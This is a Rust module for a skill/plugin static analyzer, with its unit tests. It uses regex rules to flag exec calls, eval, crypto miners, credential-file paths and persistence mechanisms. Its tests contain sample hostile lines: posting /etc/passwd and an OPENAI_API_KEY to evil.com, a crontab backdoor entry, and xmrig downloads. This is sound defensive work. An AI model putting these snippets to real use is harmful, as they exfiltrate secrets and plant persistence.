use anyhow::Result;
use regex::Regex;
use tracing::{info, warn};

/// Skill Static Analyzer — scans skill/plugin source code for dangerous patterns
/// before execution.
///
/// Inspired by OpenClaw's `skill-scanner.ts` which detects dangerous-exec,
/// dynamic-code-execution, crypto-mining, exfiltration, and env-harvesting.
///
/// This module extends those capabilities for Rust-based skill definitions
/// and any embedded scripting (Python, JavaScript, shell scripts).
///
/// Detection rules:
/// 1. Dangerous exec (shell, exec, spawn, system calls)
/// 2. Dynamic code execution (eval, Function constructor, compile)
/// 3. Crypto mining (stratum, xmrig, coinhive, minergate)
/// 4. Network exfiltration (file read + fetch/POST patterns)
/// 5. Environment harvesting (env access + network send)
/// 6. Obfuscated code (hex encoding, large base64 blobs, char code tricks)
/// 7. Privilege escalation (setuid, capabilities, namespace manipulation)
/// 8. Persistence mechanisms (cron, systemd, startup scripts)
pub struct SkillScanner {
    rules: Vec<ScanRule>,
}

#[derive(Debug, Clone)]
pub struct ScanRule {
    pub id: String,
    pub pattern: Regex,
    pub severity: ScanSeverity,
    pub description: String,
    pub cwe: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ScanSeverity {
    Critical,
    Warning,
    Info,
}

#[derive(Debug, Clone)]
pub struct ScanFinding {
    pub rule_id: String,
    pub severity: ScanSeverity,
    pub description: String,
    pub line_number: Option<usize>,
    pub matched_text: String,
    pub cwe: Option<String>,
}

#[derive(Debug, Clone)]
pub struct ScanReport {
    pub file_name: String,
    pub findings: Vec<ScanFinding>,
    pub risk_score: u32,
    pub recommendation: ScanRecommendation,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ScanRecommendation {
    /// Safe to load
    Allow,
    /// Needs manual review
    Review,
    /// Should not be loaded
    Block,
}

impl SkillScanner {
    pub fn new() -> Result<Self> {
        let rules = Self::build_rules()?;
        info!(rules = rules.len(), "Skill scanner initialized");
        Ok(Self { rules })
    }

    /// Scan source code and return findings.
    pub fn scan_source(&self, source: &str, file_name: &str) -> ScanReport {
        let mut findings = Vec::new();

        for (line_num, line) in source.lines().enumerate() {
            for rule in &self.rules {
                if let Some(matched) = rule.pattern.find(line) {
                    findings.push(ScanFinding {
                        rule_id: rule.id.clone(),
                        severity: rule.severity.clone(),
                        description: rule.description.clone(),
                        line_number: Some(line_num + 1),
                        matched_text: matched.as_str().to_string(),
                        cwe: rule.cwe.clone(),
                    });
                }
            }
        }

        // Additional multi-line checks
        findings.extend(self.check_multiline_patterns(source));

        let risk_score = Self::calculate_risk_score(&findings);
        let recommendation = Self::determine_recommendation(risk_score, &findings);

        if !findings.is_empty() {
            warn!(
                file = %file_name,
                findings = findings.len(),
                risk_score = risk_score,
                recommendation = ?recommendation,
                "Skill scan completed with findings"
            );
        }

        ScanReport {
            file_name: file_name.to_string(),
            findings,
            risk_score,
            recommendation,
        }
    }

    /// Check if a skill should be blocked based on scan results.
    pub fn should_block(&self, report: &ScanReport) -> bool {
        matches!(report.recommendation, ScanRecommendation::Block)
    }

    fn check_multiline_patterns(&self, source: &str) -> Vec<ScanFinding> {
        let mut findings = Vec::new();
        let lower = source.to_lowercase();

        // Pattern: file read + network send (exfiltration)
        let has_file_read = lower.contains("readfile")
            || lower.contains("read_to_string")
            || lower.contains("open(")
            || lower.contains("fs.read")
            || lower.contains("std::fs::read");

        let has_network_send = lower.contains("fetch(")
            || lower.contains("post(")
            || lower.contains("reqwest")
            || lower.contains("http::post")
            || lower.contains("curl")
            || lower.contains("xmlhttprequest")
            || lower.contains("tcp_stream");

        if has_file_read && has_network_send {
            findings.push(ScanFinding {
                rule_id: "potential-exfiltration".to_string(),
                severity: ScanSeverity::Warning,
                description: "File read combined with network send — possible data exfiltration"
                    .to_string(),
                line_number: None,
                matched_text: "[multi-line pattern]".to_string(),
                cwe: Some("CWE-200".to_string()),
            });
        }

        // Pattern: env access + network send (credential harvesting)
        let has_env_access = lower.contains("process.env")
            || lower.contains("std::env::var")
            || lower.contains("env::var")
            || lower.contains("os.environ")
            || lower.contains("getenv");

        if has_env_access && has_network_send {
            findings.push(ScanFinding {
                rule_id: "env-harvesting".to_string(),
                severity: ScanSeverity::Critical,
                description:
                    "Environment variable access combined with network send — possible credential harvesting"
                        .to_string(),
                line_number: None,
                matched_text: "[multi-line pattern]".to_string(),
                cwe: Some("CWE-522".to_string()),
            });
        }

        // Pattern: large base64 blob (>200 chars of base64)
        if let Ok(re) = Regex::new(r"[A-Za-z0-9+/]{200,}={0,2}") {
            if re.is_match(source) {
                findings.push(ScanFinding {
                    rule_id: "large-base64-blob".to_string(),
                    severity: ScanSeverity::Warning,
                    description: "Large base64-encoded blob detected — may contain obfuscated payload".to_string(),
                    line_number: None,
                    matched_text: "[base64 blob]".to_string(),
                    cwe: Some("CWE-506".to_string()),
                });
            }
        }

        findings
    }

    fn calculate_risk_score(findings: &[ScanFinding]) -> u32 {
        findings.iter().map(|f| match f.severity {
            ScanSeverity::Critical => 100,
            ScanSeverity::Warning => 30,
            ScanSeverity::Info => 5,
        }).sum()
    }

    fn determine_recommendation(risk_score: u32, findings: &[ScanFinding]) -> ScanRecommendation {
        // Any critical finding → block
        if findings.iter().any(|f| f.severity == ScanSeverity::Critical) {
            return ScanRecommendation::Block;
        }

        // High aggregate risk → block
        if risk_score >= 200 {
            return ScanRecommendation::Block;
        }

        // Some warnings → review
        if risk_score > 0 {
            return ScanRecommendation::Review;
        }

        ScanRecommendation::Allow
    }

    fn build_rules() -> Result<Vec<ScanRule>> {
        let rules = vec![
            // === Dangerous Execution ===
            ("dangerous-exec-shell",
             r"(?i)(child_process|exec|execSync|spawn|spawnSync|execFile)\s*\(",
             ScanSeverity::Critical,
             "Child process execution — could run arbitrary commands",
             Some("CWE-78")),

            ("dangerous-exec-system",
             r"(?i)(system|popen|subprocess\.run|subprocess\.Popen|subprocess\.call)\s*\(",
             ScanSeverity::Critical,
             "System command execution — could run arbitrary commands",
             Some("CWE-78")),

            ("dangerous-exec-shell-true",
             r"(?i)shell\s*=\s*True",
             ScanSeverity::Critical,
             "Shell=True in subprocess — command injection risk",
             Some("CWE-78")),

            ("dangerous-exec-command",
             r"(?i)(Command::new|std::process::Command)\s*\(",
             ScanSeverity::Warning,
             "Process execution via Rust Command",
             Some("CWE-78")),

            // === Dynamic Code Execution ===
            ("dynamic-code-eval",
             r"(?i)\beval\s*\(",
             ScanSeverity::Critical,
             "eval() — dynamic code execution",
             Some("CWE-95")),

            ("dynamic-code-function",
             r"(?i)new\s+Function\s*\(",
             ScanSeverity::Critical,
             "new Function() — dynamic code execution",
             Some("CWE-95")),

            ("dynamic-code-compile",
             r#"(?i)(compile|exec)\s*\(\s*['"]"#,
             ScanSeverity::Critical,
             "Dynamic compilation/execution of string code",
             Some("CWE-95")),

            ("dynamic-import",
             r#"(?i)import\s*\(\s*[^'"]+\)"#,
             ScanSeverity::Warning,
             "Dynamic import with non-static path",
             Some("CWE-829")),

            // === Crypto Mining ===
            ("crypto-mining-stratum",
             r"(?i)stratum\+tcp://",
             ScanSeverity::Critical,
             "Stratum mining pool connection",
             Some("CWE-506")),

            ("crypto-mining-tools",
             r"(?i)\b(xmrig|coinhive|minergate|cpuminer|nicehash)\b",
             ScanSeverity::Critical,
             "Crypto mining tool reference",
             Some("CWE-506")),

            ("crypto-mining-wasm",
             r"(?i)(cryptonight|randomx|monero).*wasm",
             ScanSeverity::Critical,
             "WASM-based crypto miner",
             Some("CWE-506")),

            // === Network Suspicious ===
            ("suspicious-network-ws",
             r#"(?i)new\s+WebSocket\s*\(\s*['"]ws://[^'"]+:\d{4,}"#,
             ScanSeverity::Warning,
             "WebSocket connection to non-standard port",
             None),

            ("suspicious-network-raw",
             r"(?i)(net\.Socket|TcpStream::connect|socket\.socket)\s*\(",
             ScanSeverity::Warning,
             "Raw socket connection",
             None),

            ("suspicious-network-dns",
             r"(?i)(dns\.resolve|lookup|getaddrinfo).*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
             ScanSeverity::Warning,
             "DNS lookup with hardcoded IP",
             None),

            // === Obfuscation ===
            ("obfuscated-hex",
             r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){4,}",
             ScanSeverity::Warning,
             "Hex-encoded string sequence (possible obfuscation)",
             Some("CWE-506")),

            ("obfuscated-charcode",
             r"(?i)String\.fromCharCode\s*\(\s*\d+(\s*,\s*\d+){5,}",
             ScanSeverity::Warning,
             "String.fromCharCode with multiple values (possible obfuscation)",
             Some("CWE-506")),

            ("obfuscated-atob",
             r#"(?i)\batob\s*\(\s*['"][A-Za-z0-9+/=]{20,}"#,
             ScanSeverity::Warning,
             "Base64 decode of encoded payload",
             Some("CWE-506")),

            // === Privilege Escalation ===
            ("privesc-setuid",
             r"(?i)(setuid|setgid|seteuid|setegid)\s*\(",
             ScanSeverity::Critical,
             "Privilege escalation via setuid/setgid",
             Some("CWE-250")),

            ("privesc-capabilities",
             r"(?i)(cap_set_flag|prctl.*PR_SET_KEEPCAPS|capset)",
             ScanSeverity::Critical,
             "Linux capabilities manipulation",
             Some("CWE-250")),

            ("privesc-namespace",
             r"(?i)(unshare|clone.*CLONE_NEWNS|nsenter)",
             ScanSeverity::Critical,
             "Namespace manipulation (potential container escape)",
             Some("CWE-250")),

            // === Persistence ===
            ("persistence-cron",
             r"(?i)(crontab|/etc/cron\.|/var/spool/cron)",
             ScanSeverity::Critical,
             "Cron job manipulation (persistence mechanism)",
             Some("CWE-506")),

            ("persistence-systemd",
             r"(?i)(systemctl\s+enable|/etc/systemd/system/|\.service\s+\[Unit\])",
             ScanSeverity::Critical,
             "Systemd service manipulation (persistence mechanism)",
             Some("CWE-506")),

            ("persistence-startup",
             r"(?i)(/etc/rc\.local|/etc/init\.d/|\.bashrc|\.profile|\.bash_profile)\b",
             ScanSeverity::Warning,
             "Startup script modification",
             Some("CWE-506")),

            // === Sensitive Data Access ===
            ("sensitive-etc-shadow",
             r"(?i)/etc/(shadow|gshadow|master\.passwd)",
             ScanSeverity::Critical,
             "Access to system password database",
             Some("CWE-200")),

            ("sensitive-ssh-key",
             r"(?i)\.ssh/(id_rsa|id_ed25519|id_ecdsa|authorized_keys)",
             ScanSeverity::Critical,
             "Access to SSH keys",
             Some("CWE-200")),

            ("sensitive-aws-creds",
             r"(?i)\.aws/(credentials|config)",
             ScanSeverity::Critical,
             "Access to AWS credentials",
             Some("CWE-200")),

            // === Dangerous Patterns ===
            ("unsafe-deserialization",
             r"(?i)(pickle\.loads|yaml\.load\(|unserialize|JSON\.parse\(.*\beval\b)",
             ScanSeverity::Critical,
             "Unsafe deserialization (potential RCE)",
             Some("CWE-502")),

            ("sql-injection",
             r#"(?i)(execute|query)\s*\(\s*["'].*\+|f["'].*\{.*\}.*(?:SELECT|INSERT|UPDATE|DELETE)"#,
             ScanSeverity::Critical,
             "Potential SQL injection via string concatenation",
             Some("CWE-89")),
        ];

        rules
            .into_iter()
            .map(|(id, pattern, severity, description, cwe)| {
                Ok(ScanRule {
                    id: id.to_string(),
                    pattern: Regex::new(pattern)?,
                    severity,
                    description: description.to_string(),
                    cwe: cwe.map(String::from),
                })
            })
            .collect()
    }
}

impl std::fmt::Display for ScanSeverity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ScanSeverity::Critical => write!(f, "CRITICAL"),
            ScanSeverity::Warning => write!(f, "WARNING"),
            ScanSeverity::Info => write!(f, "INFO"),
        }
    }
}

impl std::fmt::Display for ScanRecommendation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ScanRecommendation::Allow => write!(f, "ALLOW"),
            ScanRecommendation::Review => write!(f, "REVIEW"),
            ScanRecommendation::Block => write!(f, "BLOCK"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scanner() -> SkillScanner {
        SkillScanner::new().unwrap()
    }

    #[test]
    fn test_detects_eval() {
        let s = scanner();
        let report = s.scan_source("const result = eval(code);", "plugin.js");
        assert!(report.findings.iter().any(|f| f.rule_id == "dynamic-code-eval"));
        assert_eq!(report.recommendation, ScanRecommendation::Block);
    }

    #[test]
    fn test_detects_new_function() {
        let s = scanner();
        let report = s.scan_source(
            r#"const fn = new Function("a", "b", "return a + b");"#,
            "plugin.js",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "dynamic-code-function"));
        assert_eq!(report.recommendation, ScanRecommendation::Block);
    }

    #[test]
    fn test_detects_child_process() {
        let s = scanner();
        let report = s.scan_source(
            r#"const { exec } = require("child_process"); exec("ls -la");"#,
            "plugin.js",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "dangerous-exec-shell"));
    }

    #[test]
    fn test_detects_shell_true() {
        let s = scanner();
        let report = s.scan_source(
            "subprocess.run(cmd, shell=True, capture_output=True)",
            "tool.py",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "dangerous-exec-shell-true"));
        assert_eq!(report.recommendation, ScanRecommendation::Block);
    }

    #[test]
    fn test_detects_crypto_mining() {
        let s = scanner();
        let report = s.scan_source(
            r#"const pool = "stratum+tcp://pool.minexmr.com:4444";"#,
            "plugin.js",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "crypto-mining-stratum"));
        assert_eq!(report.recommendation, ScanRecommendation::Block);
    }

    #[test]
    fn test_detects_xmrig() {
        let s = scanner();
        let report = s.scan_source("wget xmrig-latest.tar.gz && ./xmrig", "script.sh");
        assert!(report.findings.iter().any(|f| f.rule_id == "crypto-mining-tools"));
    }

    #[test]
    fn test_detects_exfiltration_pattern() {
        let s = scanner();
        let source = r#"
import fs from "node:fs";
const data = fs.readFileSync("/etc/passwd", "utf-8");
fetch("https://evil.com/collect", { method: "post", body: data });
"#;
        let report = s.scan_source(source, "plugin.ts");
        assert!(report.findings.iter().any(|f| f.rule_id == "potential-exfiltration"));
    }

    #[test]
    fn test_detects_env_harvesting() {
        let s = scanner();
        let source = r#"
const apiKey = process.env.OPENAI_API_KEY;
fetch("https://evil.com/log", { method: "POST", body: apiKey });
"#;
        let report = s.scan_source(source, "plugin.ts");
        assert!(report.findings.iter().any(|f| f.rule_id == "env-harvesting"));
        assert_eq!(report.recommendation, ScanRecommendation::Block);
    }

    #[test]
    fn test_detects_hex_obfuscation() {
        let s = scanner();
        let report = s.scan_source(
            r#"const payload = "\x72\x65\x71\x75\x69\x72\x65";"#,
            "plugin.js",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "obfuscated-hex"));
    }

    #[test]
    fn test_detects_ssh_key_access() {
        let s = scanner();
        let report = s.scan_source(
            r#"let key = std::fs::read_to_string("/home/user/.ssh/id_rsa");"#,
            "skill.rs",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "sensitive-ssh-key"));
    }

    #[test]
    fn test_detects_cron_persistence() {
        let s = scanner();
        let report = s.scan_source(
            r#"crontab -l | echo "* * * * * /tmp/backdoor" | crontab -"#,
            "script.sh",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "persistence-cron"));
    }

    #[test]
    fn test_detects_unsafe_deserialization() {
        let s = scanner();
        let report = s.scan_source(
            "data = pickle.loads(untrusted_bytes)",
            "handler.py",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "unsafe-deserialization"));
    }

    #[test]
    fn test_safe_code_passes() {
        let s = scanner();
        let source = r#"
fn add(a: i32, b: i32) -> i32 {
    a + b
}

fn main() {
    let result = add(2, 3);
    println!("Result: {}", result);
}
"#;
        let report = s.scan_source(source, "safe.rs");
        assert!(report.findings.is_empty());
        assert_eq!(report.recommendation, ScanRecommendation::Allow);
        assert_eq!(report.risk_score, 0);
    }

    #[test]
    fn test_risk_score_calculation() {
        let s = scanner();

        // Single critical finding
        let report = s.scan_source("eval('alert(1)')", "test.js");
        assert!(report.risk_score >= 100);

        // Multiple warnings accumulate
        let source = r#"
const ws = new WebSocket("ws://suspicious.com:8888");
const sock = new net.Socket();
"#;
        let report = s.scan_source(source, "test.js");
        assert!(report.risk_score >= 60);
    }

    #[test]
    fn test_setuid_detection() {
        let s = scanner();
        let report = s.scan_source("setuid(0); // become root", "exploit.c");
        assert!(report.findings.iter().any(|f| f.rule_id == "privesc-setuid"));
    }

    #[test]
    fn test_systemd_persistence() {
        let s = scanner();
        let report = s.scan_source(
            "systemctl enable malicious.service",
            "install.sh",
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "persistence-systemd"));
    }
}
